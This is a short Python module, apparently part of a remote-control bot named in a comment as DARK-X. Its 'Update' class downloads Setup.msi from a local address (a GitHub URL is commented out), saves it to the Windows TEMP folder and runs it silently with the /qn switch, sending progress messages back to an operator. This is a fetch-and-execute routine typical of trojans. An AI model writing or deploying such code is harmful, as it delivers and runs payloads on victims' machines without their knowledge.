import os, sys
import requests
import tempfile
class Update():
	def __init__(self,_):
		self._ = _
		self.Main()
	def Main(self):
		self._.Send_Message("%F0%9F%93%8C Downloading Update...")
		file = tempfile.TemporaryFile()
		filename = os.environ['TEMP'] + "\\Setup.msi"
		file.close()
		req = requests.get('http://127.0.0.1/Setup.msi')#https://raw.githubusercontent.com/UQABXO/DARK-X/main/Setup.msi',headers={'User-Agent':'Chrome'})
		file = open(filename,"wb")
		file.write(req.content)
		file.close()
		dirname = os.path.dirname(os.path.abspath(sys.argv[0]))
		self._.Send_Message("%F0%9F%93%8C Executeing Update...")
		os.system(filename + " /qn")
